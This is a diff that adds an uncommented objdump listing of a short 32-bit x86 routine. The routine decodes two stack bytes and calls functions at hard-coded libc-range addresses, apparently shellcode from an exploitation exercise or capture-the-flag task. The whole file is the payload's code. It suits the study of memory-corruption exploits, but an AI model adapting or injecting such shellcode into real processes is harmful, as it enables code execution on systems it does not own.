@@ -1,0 +1,43 @@
+
+
+   0:	31 c0                	xor    %eax,%eax
+   2:	83 c0 42             	add    $0x42,%eax
+   5:	83 c0 64             	add    $0x64,%eax
+   8:	c1 e0 02             	shl    $0x2,%eax
+   b:	29 c4                	sub    %eax,%esp
+   d:	89 e0                	mov    %esp,%eax
+   f:	83 c0 07             	add    $0x7,%eax
+  12:	8a 18                	mov    (%eax),%bl
+  14:	80 eb 20             	sub    $0x20,%bl
+  17:	88 18                	mov    %bl,(%eax)
+  19:	83 c0 02             	add    $0x2,%eax
+  1c:	8a 18                	mov    (%eax),%bl
+  1e:	80 eb 20             	sub    $0x20,%bl
+  21:	88 18                	mov    %bl,(%eax)
+  23:	89 e3                	mov    %esp,%ebx
+  25:	89 d8                	mov    %ebx,%eax
+  27:	83 c0 08             	add    $0x8,%eax
+  2a:	50                   	push   %eax
+  2b:	89 d8                	mov    %ebx,%eax
+  2d:	50                   	push   %eax
+  2e:	b8 a0 c0 f4 f7       	mov    $0xf7f4c0a0,%eax
+  33:	ff d0                	call   *%eax
+  35:	83 c4 08             	add    $0x8,%esp
+  38:	50                   	push   %eax
+  39:	31 c0                	xor    %eax,%eax
+  3b:	83 c0 09             	add    $0x9,%eax
+  3e:	50                   	push   %eax
+  3f:	31 c0                	xor    %eax,%eax
+  41:	83 c0 01             	add    $0x1,%eax
+  44:	50                   	push   %eax
+  45:	89 d8                	mov    %ebx,%eax
+  47:	83 c0 0a             	add    $0xa,%eax
+  4a:	50                   	push   %eax
+  4b:	b8 04 78 e8 f7       	mov    $0xf7e87804,%eax
+  50:	83 e8 04             	sub    $0x4,%eax
+  53:	ff d0                	call   *%eax
+  55:	83 c4 0c             	add    $0xc,%esp
+  58:	b8 30 c3 f4 f7       	mov    $0xf7f4c330,%eax
+  5d:	ff d0                	call   *%eax
+  5f:	b8 30 3f e5 f7       	mov    $0xf7e53f30,%eax
+  64:	ff d0                	call   *%eax
